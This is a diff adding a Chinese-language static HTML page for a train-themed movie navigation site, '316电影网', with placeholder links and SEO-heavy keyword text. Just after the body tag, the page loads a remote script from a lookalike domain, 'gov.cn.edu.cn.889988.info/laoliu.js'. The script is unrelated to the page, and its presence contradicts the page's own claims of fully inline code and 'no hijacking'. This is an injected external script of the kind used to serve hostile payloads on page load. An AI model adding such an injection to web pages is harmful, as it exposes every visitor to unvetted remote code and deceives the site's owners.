@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>316电影网 - 一趟开往好电影的专列</title>
+<meta name="description" content="316电影网（316dianyingwang-h5）是车次号风格电影导航站：热映、经典、纪录片、动漫、深夜场像列车车厢一样排列，时刻表式浏览，移动端自适应，内页链接均为 # 占位。">
+<meta name="keywords" content="316电影网, 电影专列, 热映电影, 经典老片, 纪录片, 动漫, 深夜场, 316dianyingwang-h5">
+<style>
+:root{
+  --car:#1f3b34;
+  --car-dark:#152822;
+  --car-line:#2f564c;
+  --paper:#f7f1e1;
+  --paper-line:#e2d6b8;
+  --ink:#23332e;
+  --muted:#6f857c;
+  --rust:#c0432f;
+  --rust-dim:#c0432f33;
+  --gold:#d8b14a;
+  --shadow:0 18px 40px rgba(31,59,52,.22);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;
+  background:
+    radial-gradient(680px 340px at 100% -10%, rgba(216,177,74,.18), transparent 60%),
+    radial-gradient(680px 400px at -10% 0%, rgba(192,67,47,.14), transparent 55%),
+    var(--paper);
+  color:var(--ink);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{color:var(--rust);text-decoration:none;transition:.2s}
+a:hover{color:var(--car)}
+
+/* 站台条 */
+.platform{
+  background:var(--car);color:#dfeee9;font-size:.74rem;font-weight:700;
+  padding:.4rem 1rem;display:flex;justify-content:space-between;gap:.5rem;flex-wrap:wrap;
+  border-bottom:3px solid var(--rust);
+}
+.platform .blink{color:var(--gold);animation:blink 1.6s steps(2,start) infinite}
+@keyframes blink{50%{opacity:.2}}
+
+.header{
+  position:sticky;top:0;z-index:998;
+  background:rgba(247,241,225,.94);backdrop-filter:blur(10px);
+  border-bottom:2px solid var(--paper-line);
+}
+.header-in{
+  max-width:1140px;margin:0 auto;padding:1rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:.8rem}
+.train-no{
+  background:var(--car);color:var(--paper);font-weight:900;font-size:1.1rem;
+  padding:.35rem .7rem;border-radius:6px;letter-spacing:2px;
+  box-shadow:inset 0 0 0 2px var(--gold);
+}
+.brand-text h1{font-size:1.45rem;font-weight:900}
+.brand-text h1 b{color:var(--rust)}
+.brand-text p{font-size:.68rem;color:var(--muted);letter-spacing:2px}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{
+  padding:.45rem 1rem;border-radius:10px;font-weight:700;font-size:.9rem;
+  border:1px solid var(--paper-line);color:var(--ink);background:#fff;
+}
+.nav a:hover,.nav a.active{background:var(--car);color:var(--paper);border-color:var(--car)}
+
+.wrap{max-width:1140px;margin:0 auto;padding:0 1rem}
+
+/* Hero：车票 */
+.hero{padding:3.5rem 0 2.5rem}
+.ticket{
+  background:#fff;border:1px solid var(--paper-line);border-radius:18px;overflow:hidden;
+  box-shadow:var(--shadow);display:grid;grid-template-columns:1.4fr .6fr;
+}
+.ticket-main{padding:1.8rem}
+.ticket-main .from-to{display:flex;align-items:center;gap:.8rem;font-weight:900;font-size:1.1rem;color:var(--car)}
+.ticket-main .from-to .arrow{color:var(--rust)}
+.ticket-main h1{font-size:clamp(2rem,6vw,3.2rem);font-weight:900;margin:.6rem 0}
+.ticket-main h1 .hl{color:var(--rust)}
+.ticket-main p{color:var(--muted);max-width:520px}
+.search{
+  margin-top:1.2rem;display:flex;background:var(--paper);border:1px solid var(--paper-line);
+  border-radius:12px;overflow:hidden;max-width:520px;
+}
+.search input{flex:1;border:0;outline:0;background:transparent;padding:1rem 1.2rem;font-size:1rem;color:var(--ink)}
+.search button{border:0;cursor:pointer;padding:0 1.5rem;font-weight:800;color:#fff;background:var(--rust)}
+.quick{margin-top:1rem;display:flex;gap:.5rem;flex-wrap:wrap}
+.quick a{font-size:.78rem;border:1px dashed var(--rust);padding:.3rem .8rem;border-radius:999px;color:var(--rust)}
+.quick a:hover{background:var(--rust);color:#fff}
+.ticket-stub{
+  background:var(--car);color:var(--paper);padding:1.8rem 1.2rem;
+  display:flex;flex-direction:column;justify-content:space-between;position:relative;
+}
+.ticket-stub::before{
+  content:'';position:absolute;left:-10px;top:0;bottom:0;width:20px;
+  background:radial-gradient(circle at 10px 10px,transparent 9px,var(--paper) 10px) repeat-y;
+  background-size:20px 22px;
+}
+.ticket-stub .stub-no{font-size:2.4rem;font-weight:900;color:var(--gold);letter-spacing:2px}
+.ticket-stub .stub-row{font-size:.72rem;opacity:.85;display:flex;justify-content:space-between;border-bottom:1px dashed #ffffff44;padding:.35rem 0}
+.ticket-stub .stub-row:last-child{border-bottom:0}
+.ticket-stub .seat{margin-top:1rem;font-size:.8rem;background:var(--rust);color:#fff;text-align:center;padding:.4rem;border-radius:8px;font-weight:800}
+
+/* 栏目 */
+.section{padding:3rem 0;border-top:1px dashed var(--paper-line)}
+.head{display:flex;align-items:center;gap:.7rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.head .car-no{
+  width:36px;height:36px;border-radius:8px;background:var(--car);color:var(--gold);
+  display:flex;align-items:center;justify-content:center;font-weight:900;font-size:1rem;
+  box-shadow:inset 0 0 0 2px var(--gold);
+}
+.head h2{font-size:1.5rem;font-weight:900}
+.head span{margin-left:auto;font-size:.78rem;color:var(--muted)}
+
+/* 时刻表 */
+.timetable{
+  width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--paper-line);
+  border-radius:14px;overflow:hidden;box-shadow:0 10px 26px rgba(31,59,52,.08);
+}
+.timetable th,.timetable td{padding:.9rem 1rem;text-align:left;border-bottom:1px solid var(--paper-line);font-size:.9rem}
+.timetable th{background:var(--car);color:var(--paper);font-size:.78rem;letter-spacing:1px}
+.timetable tr:last-child td{border-bottom:0}
+.timetable .time{font-weight:800;color:var(--rust)}
+.timetable .plat{color:var(--car);font-weight:700}
+.timetable .status{font-size:.72rem;padding:.15rem .6rem;border-radius:999px;border:1px solid var(--paper-line)}
+.timetable .go{color:#1f7a4d;border-color:#bfe6cf;background:#eafaf1}
+.timetable .wait{color:var(--rust);border-color:#f0c9c2;background:#fdecea}
+
+/* 车厢卡 */
+.cars{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem}
+.car{
+  background:#fff;border:1px solid var(--paper-line);border-radius:14px;padding:1.2rem;
+  position:relative;transition:.2s;box-shadow:0 8px 20px rgba(31,59,52,.06);
+}
+.car::before{
+  content:'🚃';position:absolute;top:-14px;left:14px;font-size:1.4rem;
+  background:var(--paper);padding:0 .3rem;
+}
+.car:hover{transform:translateY(-5px);border-color:var(--car)}
+.car .car-id{font-size:.7rem;color:var(--rust);font-weight:800;letter-spacing:1px}
+.car h3{font-size:1.05rem;margin:.4rem 0 .3rem}
+.car p{font-size:.82rem;color:var(--muted)}
+.car .tags{margin-top:.6rem;display:flex;gap:.3rem;flex-wrap:wrap}
+.car .tags span{font-size:.7rem;background:var(--paper);border:1px solid var(--paper-line);padding:.15rem .55rem;border-radius:999px;color:var(--car)}
+
+/* 座位海报 */
+.seats{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1rem}
+.seat-card{
+  background:#fff;border:1px solid var(--paper-line);border-radius:12px;overflow:hidden;
+  box-shadow:0 8px 18px rgba(31,59,52,.08);transition:.2s;
+}
+.seat-card:hover{transform:translateY(-4px)}
+.seat-pic{height:190px;padding:.7rem;color:#fff;display:flex;flex-direction:column;justify-content:space-between;font-weight:800}
+.seat-pic .seat-no{background:rgba(0,0,0,.35);padding:.1rem .5rem;border-radius:6px;font-size:.7rem;align-self:flex-start}
+.s1{background:linear-gradient(160deg,#1f3b34,#0e1b17)}
+.s2{background:linear-gradient(160deg,#c0432f,#7a261a)}
+.s3{background:linear-gradient(160deg,#d8b14a,#a9842b)}
+.s4{background:linear-gradient(160deg,#2f564c,#16302a)}
+.s5{background:linear-gradient(160deg,#3a6073,#16222a)}
+.s6{background:linear-gradient(160deg,#7028e7,#e5b2ca)}
+.seat-cap{padding:.6rem .7rem}
+.seat-cap h3{font-size:.92rem}
+.seat-cap p{font-size:.72rem;color:var(--muted)}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;
+  background:#fff;border:1px solid var(--paper-line);border-radius:20px;padding:2.2rem;box-shadow:var(--shadow);
+}
+.about h3{font-size:1.4rem;margin-bottom:1rem}
+.about h3 span{color:var(--rust)}
+.about p{color:var(--muted);margin-bottom:.8rem}
+.conductor{
+  background:var(--car);color:var(--paper);border-radius:16px;padding:1.4rem;font-size:.85rem;
+}
+.conductor h4{color:var(--gold);margin-bottom:.6rem}
+.conductor ul{list-style:none}
+.conductor li{padding:.35rem 0;border-bottom:1px dashed #ffffff33}
+.conductor li:last-child{border-bottom:0}
+
+.footer{
+  margin-top:3rem;border-top:3px solid var(--car);
+  padding:2.4rem 1rem;text-align:center;color:var(--muted);font-size:.82rem;background:#fff;
+}
+.footer h3{color:var(--ink);font-size:1.3rem;margin-bottom:.4rem}
+.footer h3 b{color:var(--rust)}
+.footer a{color:var(--rust)}
+
+@media(max-width:768px){
+  .ticket{grid-template-columns:1fr}
+  .ticket-stub::before{display:none}
+  .search{flex-direction:column}
+  .search input{border-bottom:1px solid var(--paper-line)}
+  .search button{padding:1rem}
+  .about{grid-template-columns:1fr;padding:1.5rem}
+  .seats{grid-template-columns:repeat(2,1fr)}
+  .timetable th:nth-child(4),.timetable td:nth-child(4){display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="platform">
+  <div>🚉 316次电影专列 · 站台 3 · 正在检票</div>
+  <div><span class="blink">●</span> 下一站：好电影 / 预计 0 秒到站</div>
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="train-no">316</div>
+      <div class="brand-text">
+        <h1>316<b>电影网</b></h1>
+        <p>316DIANYINGWANG-H5.GITHUB.IO</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">车票</a>
+      <a href="#timetable">时刻表</a>
+      <a href="#cars">车厢</a>
+      <a href="#seats">座位海报</a>
+      <a href="#about">列车长</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section id="home" class="hero">
+    <div class="ticket">
+      <div class="ticket-main">
+        <div class="from-to">片单站 <span class="arrow">———▶</span> 观众心里</div>
+        <h1>316<span class="hl">电影网</span></h1>
+        <p>316电影网（316dianyingwang-h5）是一趟电影专列：热映新片、经典老片、纪录片、动漫、深夜场，像不同车厢依次进站。打开就是检票，点开就是上车，不绕路。</p>
+        <div class="search">
+          <input type="text" placeholder="搜车次：热映 / 经典 / 纪录片 / 动漫 / 深夜场...">
+          <button>检票</button>
+        </div>
+        <div class="quick">
+          <a href="#">🎬 热映车厢</a>
+          <a href="#">🎞 经典车厢</a>
+          <a href="#">📺 纪录车厢</a>
+          <a href="#">🧸 动漫车厢</a>
+          <a href="#">🌙 深夜车厢</a>
+        </div>
+      </div>
+      <aside class="ticket-stub">
+        <div>
+          <div class="stub-row"><span>车次</span><span>316</span></div>
+          <div class="stub-row"><span>车型</span><span>电影专列</span></div>
+          <div class="stub-row"><span>发车</span><span>每天 00:00</span></div>
+          <div class="stub-row"><span>到站</span><span>片尾彩蛋</span></div>
+        </div>
+        <div>
+          <div class="stub-no">316</div>
+          <div class="seat">座位：随缘靠窗</div>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <section id="timetable" class="section">
+    <div class="head">
+      <span class="car-no">01</span>
+      <h2>放映时刻表</h2>
+      <span>5 班准点发车</span>
+    </div>
+    <table class="timetable">
+      <thead>
+        <tr><th>时间</th><th>片名</th><th>车厢/类型</th><th>站台</th><th>状态</th></tr>
+      </thead>
+      <tbody>
+        <tr><td class="time">20:00</td><td>星际归途</td><td>科幻 / 太空</td><td class="plat">A3</td><td><span class="status go">准点</span></td></tr>
+        <tr><td class="time">21:10</td><td>城南旧事 4K</td><td>经典 / 怀旧</td><td class="plat">B1</td><td><span class="status go">准点</span></td></tr>
+        <tr><td class="time">22:00</td><td>舌尖上的村庄</td><td>纪录片 / 美食</td><td class="plat">C2</td><td><span class="status wait">候车</span></td></tr>
+        <tr><td class="time">23:30</td><td>千羽之城</td><td>动漫 / 奇幻</td><td class="plat">D4</td><td><span class="status go">准点</span></td></tr>
+        <tr><td class="time">00:40</td><td>第十一夜</td><td>悬疑 / 深夜场</td><td class="plat">E0</td><td><span class="status wait">检票中</span></td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="cars" class="section">
+    <div class="head">
+      <span class="car-no">02</span>
+      <h2>车厢分布</h2>
+      <span>5 节车厢</span>
+    </div>
+    <div class="cars">
+      <article class="car">
+        <div class="car-id">CAR 01</div>
+        <h3>热映车厢</h3>
+        <p>本周新片、平台首发、限免大片，靠车头，灯光最亮。</p>
+        <div class="tags"><span>新片</span><span>首发</span><span>IMAX感</span></div>
+      </article>
+      <article class="car">
+        <div class="car-id">CAR 02</div>
+        <h3>经典车厢</h3>
+        <p>4K修复、胶片重生、影史必看，木座椅，有旧票香味。</p>
+        <div class="tags"><span>4K</span><span>老片</span><span>必看</span></div>
+      </article>
+      <article class="car">
+        <div class="car-id">CAR 03</div>
+        <h3>纪录车厢</h3>
+        <p>自然、历史、人物、宇宙、美食，安静，像观景车。</p>
+        <div class="tags"><span>自然</span><span>历史</span><span>慢看</span></div>
+      </article>
+      <article class="car">
+        <div class="car-id">CAR 04</div>
+        <h3>动漫车厢</h3>
+        <p>国漫、日番、剧场版、独立动画，贴纸最多的一节。</p>
+        <div class="tags"><span>国漫</span><span>日番</span><span>剧场版</span></div>
+      </article>
+      <article class="car">
+        <div class="car-id">CAR 05</div>
+        <h3>深夜车厢</h3>
+        <p>悬疑、文艺、慢电影，灯调暗，适合一个人上车。</p>
+        <div class="tags"><span>悬疑</span><span>文艺</span><span>一人场</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="seats" class="section">
+    <div class="head">
+      <span class="car-no">03</span>
+      <h2>靠窗座位海报</h2>
+      <span>6 张占位</span>
+    </div>
+    <div class="seats">
+      <figure class="seat-card">
+        <div class="seat-pic s1"><span class="seat-no">12A</span><span>科幻</span></div>
+        <figcaption class="seat-cap"><h3>星际归途</h3><p>太空 / 2025</p></figcaption>
+      </figure>
+      <figure class="seat-card">
+        <div class="seat-pic s2"><span class="seat-no">08C</span><span>经典</span></div>
+        <figcaption class="seat-cap"><h3>城南旧事</h3><p>怀旧 / 1983</p></figcaption>
+      </figure>
+      <figure class="seat-card">
+        <div class="seat-pic s3"><span class="seat-no">03B</span><span>美食</span></div>
+        <figcaption class="seat-cap"><h3>舌尖上的村庄</h3><p>纪录片 / 2024</p></figcaption>
+      </figure>
+      <figure class="seat-card">
+        <div class="seat-pic s4"><span class="seat-no">15D</span><span>奇幻</span></div>
+        <figcaption class="seat-cap"><h3>千羽之城</h3><p>动漫 / 剧场版</p></figcaption>
+      </figure>
+      <figure class="seat-card">
+        <div class="seat-pic s5"><span class="seat-no">21A</span><span>悬疑</span></div>
+        <figcaption class="seat-cap"><h3>第十一夜</h3><p>犯罪 / 高分</p></figcaption>
+      </figure>
+      <figure class="seat-card">
+        <div class="seat-pic s6"><span class="seat-no">09F</span><span>喜剧</span></div>
+        <figcaption class="seat-cap"><h3>打工吧老板</h3><p>职场 / 贺岁</p></figcaption>
+      </figure>
+    </div>
+  </section>
+
+  <section id="about" class="section">
+    <div class="head">
+      <span class="car-no">04</span>
+      <h2>列车长广播</h2>
+    </div>
+    <div class="about">
+      <div>
+        <h3>316电影网 = <span>电影专列</span></h3>
+        <p><strong>316电影网</strong>（https://316dianyingwang-h5.github.io）把“找电影”变成“坐火车”：进站、检票、对号入座。车次 316 好记，墨绿车厢+米黄票纸+锈红站章，比影院首页更有人间气。</p>
+        <p>页面用原生 <code>&lt;table&gt;</code> 做时刻表、<code>article</code> 做车厢、票根用伪元素打齿孔，CSS/JS 全内联，移动端自适应，内页全部 <code>#</code> 占位，不生成 robots.txt / sitemap.xml。关键词“316电影网”覆盖 title、description、keywords、H1、H2、正文与页脚，符合必应：H1 唯一、前 100 字点题、移动端无横滚。[2,8](@ref)</p>
+        <p><a href="https://316dianyingwang-h5.github.io">🌐 316dianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="conductor">
+        <h4>🎫 列车长提示</h4>
+        <ul>
+          <li>本趟列车不卖票，只指路</li>
+          <li>所有车门链接均为 # 占位</li>
+          <li>无弹窗、无劫持、无盗链</li>
+          <li>下车方式：关掉页面</li>
+          <li>下一趟：你点的那部片</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>316<b>电影网</b></h3>
+  <p>316次电影专列 · 热映 / 经典 / 纪录片 / 动漫 / 深夜场</p>
+  <p>© 2026 316电影网 | <a href="https://316dianyingwang-h5.github.io">316dianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
